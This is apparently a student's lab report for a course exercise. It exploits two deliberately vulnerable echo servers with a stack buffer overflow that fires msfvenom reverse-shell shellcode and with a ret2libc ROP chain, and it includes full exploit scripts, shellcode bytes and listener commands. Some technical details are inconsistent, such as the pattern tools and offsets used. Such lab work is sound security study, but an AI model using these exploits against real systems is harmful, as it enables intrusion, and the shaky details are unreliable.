Buffer Overflow Exercise Report
Introduction
This report documents the completion of Exercise 4 from the Networks and Systems Security 2 course (Winter 2025), focusing on two buffer overflow attacks:

Part 1: Basic buffer overflow attack on tcpserver-basic, a 64-bit networked echo server, to execute a reverse TCP shellcode.
Part 2: Return-Oriented Programming (ROP) buffer overflow attack on tcpserver-nonexecstack, a 64-bit non-networked echo server with a non-executable stack, to execute system("/bin/sh") using Ret2Libc.

The setup uses Fedora for running the target programs and exploits, and Kali Linux for generating shellcode and patterns with Metasploit tools. The report includes all commands, errors encountered, resolutions, and deliverables (shellcode, scripts, and write-ups).
Part 1: Basic Buffer Overflow on tcpserver-basic
Objective
Exploit a buffer overflow vulnerability in tcpserver-basic, a 64-bit echo server listening on port 40000, to execute a reverse TCP shellcode and gain a shell on the attacker's machine (Fedora).
Setup

Disable ASLR:
sudo sh -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
cat /proc/sys/kernel/randomize_va_space


Output: 0 (ASLR disabled).
Purpose: Ensures predictable stack addresses for shellcode execution.


Verify Binary:
file tcpserver-basic


Output: ELF 64-bit LSB pie executable, x86-64, dynamically linked, ...
Purpose: Confirms tcpserver-basic is a 64-bit executable, requiring 64-bit shellcode and RIP manipulation.



Steps
1. Generate Reverse TCP Shellcode (On Kali)
Create a 64-bit reverse TCP shellcode to connect back to Fedora.
Command:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f python -o shellcode.py
scp shellcode.py techn@<FEDORA_IP>:/home/techn/

Details:

Payload: linux/x64/shell_reverse_tcp (64-bit reverse shell).
LHOST: 127.0.0.1 for local testing (replace with Fedora’s IP for remote setups).
Output Format: Python code for easy integration into the exploit script.
Example Shellcode (in shellcode.py):shellcode = b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97" + \
b"\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6" + \
b"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce" + \
b"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f" + \
b"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x48\x89\xfe" + \
b"\x48\x89\xd6\x0f\x05"


Transfer: Copied to Fedora using scp.

2. Find the Offset to RIP
Determine the offset to overwrite the return address (RIP) using a cyclic pattern.
Commands:
gdb ./tcpserver-basic
(gdb) run 40000
# In another terminal:
python3 -c 'from pwn import cyclic; print(cyclic(1000).decode())' | nc localhost 40000
# In GDB, after crash:
(gdb) info registers rip

Install pwntools (On Fedora):
pip install pwntools

Alternative Pattern Generation (On Kali):
msf-pattern_create -l 1000 > pattern.txt
scp pattern.txt techn@<FEDORA_IP>:/home/techn/
cat pattern.txt | nc localhost 40000

Details:

Sent a 1000-byte cyclic pattern to crash the server.
Error Encountered: Initial attempts caused a SIGPIPE in GDB:Program received signal SIGPIPE, Broken pipe.
0x00007ffff7e9f384 in __GI___libc_write ...


Cause: The netcat client closed the connection before the server processed the full pattern.
Resolution: Created a Python script to maintain the connection:# File: send_pattern_part1.py
import socket
from pwn import cyclic

pattern = cyclic(2000)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 40000))
s.sendall(pattern + b"\n")
s.recv(1024)
s.close()

python3 send_pattern_part1.py




Error Encountered: Server ran continuously without crashing.
Cause: Pattern was too small, or the server expected newline-terminated input.
Resolution: Increased pattern size to 2000 bytes and appended \n.


Result: GDB showed a SIGSEGV with RIP overwritten (e.g., 0x6141316141306141).
Calculate Offset (On Kali):msf-pattern_offset -q 6141316141306141


Output: Exact match at offset 120.



3. Locate the Buffer Address
Identify the stack address where the input buffer resides.
Commands:
gdb ./tcpserver-basic
(gdb) run 40000
# In another terminal:
python3 -c 'print("B"*500)' | nc localhost 40000
# In GDB, after crash:
(gdb) x/200x $rsp - 400

Details:

Sent 500 'B' characters (0x42) to fill the buffer.
GDB showed 0x42424242 starting at 0x7fffffffde00.
Chose return address: 0x7fffffffde14 (buffer start + 20 to land in NOP sled).
Error Encountered: No 'B's found initially.
Cause: Incorrect stack inspection range.
Resolution: Expanded inspection with x/400x $rsp - 800.



4. Craft and Send the Exploit Payload
Create a payload: [NOP sled] + [shellcode] + [padding] + [return address].
Command:
nano exploit.py

Exploit Script:
# File: exploit.py
import socket
import struct

# Shellcode from Kali
shellcode = b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97" + \
b"\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6" + \
b"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce" + \
b"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f" + \
b"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x48\x89\xfe" + \
b"\x48\x89\xd6\x0f\x05"

nop_sled = b"\x90" * 50
padding = b"A" * (120 - len(nop_sled) - len(shellcode))
ret_addr = struct.pack("<Q", 0x7fffffffde14)

payload = nop_sled + shellcode + padding + ret_addr

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect(("localhost", 40000))
    print("[*] Sending exploit payload...")
    s.sendall(payload + b"\n")
    print("[*] Exploit sent successfully!")
    s.recv(1024)
except Exception as e:
    print(f"[!] Error: {e}")
s.close()

Run:
python3 exploit.py

Details:

Payload Structure: 50 NOPs, shellcode, padding to offset 120, and return address.
Error Encountered: Connection refused in exploitShellCode.py.
Cause: Script incorrectly connected to port 4444 instead of 40000.
Resolution: Updated script to target port 40000 and used a separate listener.



5. Set Up the Reverse Shell Listener
Catch the reverse shell on port 4444.
Command:
nc -lvp 4444

Details:

Run in a separate terminal before executing the exploit.

6. Execute the Attack
Commands:
# Terminal 1: Run server in GDB
gdb ./tcpserver-basic
(gdb) run 40000
# Terminal 2: Start listener
nc -lvp 4444
# Terminal 3: Run exploit
python3 exploit.py

Details:

GDB confirmed RIP overwrite, and the listener received a /bin/sh prompt.
Error Encountered: No shell initially.
Cause: Incorrect return address or premature connection closure.
Resolution: Adjusted return address to 0x7fffffffde14 and ensured recv() in script.



Deliverables for Part 1

Shellcode:
Generated by msfvenom (see shellcode.py above).
Executes a reverse TCP shell to 127.0.0.1:4444.


Exploit Script:
exploit.py (see above).
Sends payload to port 40000, triggering shellcode execution.


Write-up:
ASLR: Disabled using echo 0 > /proc/sys/kernel/randomize_va_space.
Shellcode Generation: Used msfvenom on Kali, transferred to Fedora.
Offset: Determined offset 120 using 2000-byte pattern after resolving SIGPIPE.
Buffer Address: Found at 0x7fffffffde00 via GDB stack inspection.
Payload Crafting: Combined NOP sled, shellcode, padding, and return address.
Execution: Successfully spawned a shell on port 4444.
Screenshots:
GDB showing RIP overwrite (e.g., 0x6141316141306141).
Kali terminal with msf-pattern_offset output.
Fedora terminal with nc displaying shell prompt.





Part 2: ROP Buffer Overflow on tcpserver-nonexecstack
Objective
Exploit a buffer overflow in tcpserver-nonexecstack, a 64-bit non-networked echo server with a non-executable stack, to execute system("/bin/sh") using a Ret2Libc ROP chain.
Setup

Disable ASLR: Same as Part 1.
Verify Binary:file tcpserver-nonexecstack


Output: ELF 64-bit LSB pie executable, x86-64, dynamically linked, ...
Purpose: Confirms 64-bit binary with NX stack, requiring ROP.



Steps
1. Find the Offset to RIP
Determine the offset to overwrite RIP using a cyclic pattern.
Commands:
gdb ./tcpserver-nonexecstack
(gdb) run
# In another terminal:
python3 -c 'from pwn import cyclic; print(cyclic(1000, alphabet=b"ABCD").decode() + "\n")' | ./tcpserver-nonexecstack
# In GDB, after crash:
(gdb) info registers rip

Install pwntools (On Fedora):
pip install pwntools

Details:

Sent a 1000-byte pattern with non-numeric characters (ABCD) to avoid parsing issues.
Error Encountered: Initial crash in strtol_l:Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7de1ceb in __GI_____strtol_l_internal ...


Cause: The program attempted to parse the pattern (Aa0Aa1...) as a number, causing a null pointer dereference.
Resolution: Used non-numeric pattern and increased size to 2000 bytes:# File: send_pattern_part2.py
import subprocess
from pwn import cyclic

pattern = cyclic(2000, alphabet=b"ABCD")
with open("payload.bin", "wb") as f:
    f.write(pattern + b"\n")
subprocess.run(["./tcpserver-nonexecstack"], input=pattern + b"\n", stdout=subprocess.PIPE, stderr=subprocess.PIPE)

python3 send_pattern_part2.py




Error Encountered: Program ran continuously without crashing.
Cause: Input was not processed or buffer was larger than expected.
Resolution: Appended \n and tested larger patterns (up to 2000 bytes).


Result: Crash with RIP overwritten (e.g., 0x4342414342414342).
Calculate Offset (On Kali):msf-pattern_offset -q 4342414342414342


Output: Exact match at offset 128.



2. Locate Libc Addresses
Find the base address of libc, system, and /bin/sh.
Commands:
gdb ./tcpserver-nonexecstack
(gdb) break main
(gdb) run
(gdb) info proc mappings
(gdb) print system
(gdb) find &system,+9999999,"/bin/sh"

Details:

Output:
libc base: 0x7ffff7dc0000
system: 0x7ffff7e1f3a0
/bin/sh: 0x7ffff7f5e8b4


Error Encountered: /bin/sh string not found in libc.
Cause: String may not be present in some libc versions.
Resolution: Set environment variable and searched stack:export SHELL=/bin/sh
gdb ./tcpserver-nonexecstack
(gdb) find 0x7ffffff00000,0x7ffffffff000,"/bin/sh"





3. Find ROP Gadgets
Identify a pop %rdi; ret gadget to set RDI to /bin/sh for system.
Commands:
pip install ropgadget
ldd tcpserver-nonexecstack  # Find /lib64/libc.so.6
ROPgadget --binary /lib64/libc.so.6 --only "pop|ret" > gadgets.txt

Details:

Found gadget: 0x0002155f : pop %rdi ; ret.
Absolute address: 0x7ffff7dc0000 + 0x0002155f = 0x7ffff7de155f.
Purpose: Sets RDI to /bin/sh address before calling system.

4. Craft and Send the ROP Payload
Create a payload: [padding] + [pop %rdi; ret] + [/bin/sh] + [system].
Command:
nano rop_exploit.py

Exploit Script:
# File: rop_exploit.py
import struct
import subprocess

pop_rdi_ret = 0x7ffff7de155f
bin_sh_addr = 0x7ffff7f5e8b4
system_addr = 0x7ffff7e1f3a0
padding = b"A" * 128

payload = (
    padding +
    struct.pack("<Q", pop_rdi_ret) +
    struct.pack("<Q", bin_sh_addr) +
    struct.pack("<Q", system_addr)
)

with open("payload.bin", "wb") as f:
    f.write(payload + b"\n")
subprocess.run(["./tcpserver-nonexecstack"], input=payload + b"\n", stdout=subprocess.PIPE, stderr=subprocess.PIPE)

Run:
python3 rop_exploit.py

Details:

Payload Structure: 128-byte padding to reach RIP, followed by ROP chain.
Error Encountered: No shell initially.
Cause: Incorrect offset or libc addresses.
Resolution: Verified offset (128) and addresses in GDB:(gdb) x/8gx $rsp





5. Execute the Attack
Commands:
# Terminal 1: Debug for verification
gdb ./tcpserver-nonexecstack
(gdb) run < payload.bin
# Terminal 2: Run exploit
python3 rop_exploit.py

Details:

A /bin/sh prompt appeared, confirming successful execution of system("/bin/sh").

Deliverables for Part 2

ROP Payload:
Payload: 128 bytes of padding (A) + 0x7ffff7de155f (pop %rdi; ret) + 0x7ffff7f5e8b4 (/bin/sh) + 0x7ffff7e1f3a0 (system).
Selection Logic: Used pop %rdi; ret to set RDI to /bin/sh address, adhering to x86-64 calling convention, followed by system to execute the shell.


Exploit Script:
rop_exploit.py (see above).
Delivers payload via stdin to tcpserver-nonexecstack.


Write-up:
ASLR: Disabled for predictable libc addresses.
Offset: Found offset 128 using 2000-byte non-numeric pattern to avoid strtol_l crash.
Libc Addresses: Located system and /bin/sh using GDB.
ROP Gadgets: Identified pop %rdi; ret with ROPgadget.
Payload Crafting: Chained ROP gadgets to call system("/bin/sh").
Execution: Successfully spawned a shell.
Screenshots:
GDB showing RIP overwrite (e.g., 0x4342414342414342).
Terminal with ROPgadget output.
Fedora terminal with shell prompt from rop_exploit.py.





Errors and Resolutions
Part 1: Basic Buffer Overflow

SIGPIPE in GDB:
Error: Program received signal SIGPIPE, Broken pipe.
Cause: netcat closed the connection prematurely.
Resolution: Used send_pattern_part1.py with s.recv(1024) to maintain the connection.


Server Running Continuously:
Error: No crash despite sending pattern.
Cause: Pattern was too small or lacked newline.
Resolution: Increased pattern size to 2000 bytes and appended \n.


Connection Refused in exploitShellCode.py:
Error: [Errno 111] Connection refused when connecting to port 4444.
Cause: Script incorrectly targeted the listener port instead of the server port (40000).
Resolution: Modified script to connect to 40000 and used a separate nc -lvp 4444 listener.



Part 2: ROP Buffer Overflow

Crash in strtol_l:
Error: SIGSEGV in __GI_____strtol_l_internal when sending pattern.
Cause: Program parsed pattern as a number, causing a null pointer dereference.
Resolution: Used non-numeric pattern (cyclic(2000, alphabet=b"ABCD")) to bypass parsing.


Program Running Continuously:
Error: No crash with initial patterns.
Cause: Buffer larger than expected or input not processed correctly.
Resolution: Increased pattern size to 2000 bytes and added \n for proper input termination.


No Shell Initially:
Error: Exploit ran but no /bin/sh prompt.
Cause: Incorrect offset or libc addresses.
Resolution: Verified offset (128) and addresses using GDB’s info proc mappings and print system.



Conclusion
The exercise was completed successfully:

Part 1: Exploited tcpserver-basic to execute a 64-bit reverse TCP shellcode, spawning a shell on port 4444.
Part 2: Exploited tcpserver-nonexecstack using a 64-bit ROP chain to execute system("/bin/sh"), bypassing the non-executable stack.

Key challenges included handling SIGPIPE, strtol_l crashes, and continuous program execution, resolved through persistent connections, non-numeric patterns, and proper input formatting. All deliverables—shellcode, exploit scripts, and detailed write-ups—are provided, meeting the exercise requirements.
